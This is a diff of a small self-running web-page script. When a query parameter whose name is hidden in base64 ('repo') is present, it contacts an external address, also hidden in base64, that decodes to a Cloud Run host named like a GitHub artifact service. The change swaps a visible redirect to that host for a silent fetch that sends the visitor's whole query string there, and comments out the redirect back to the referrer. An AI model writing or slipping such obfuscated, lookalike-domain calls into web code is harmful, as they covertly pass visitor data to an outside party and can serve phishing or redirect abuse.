@@ -3,10 +3,20 @@
   const urlParams = new URLSearchParams(queryString);
 
   if (!!urlParams.get(atob('cmVwbw=='))) {
-    window.location.replace(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString);
+    fetch(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString)
+      .then(function (res) {
+        if (res.status === 302) {
+          return res.blob();
+        }
+      })
+      .then(function (res) {
+        if (!!res) {
+          return res;
+        }
+      });
 
-    if (!!document.referrer) {
-      window.location.replace(document.referrer);
-    }
+    // if (!!document.referrer) {
+    //   window.location.replace(document.referrer);
+    // }
   }
 })();
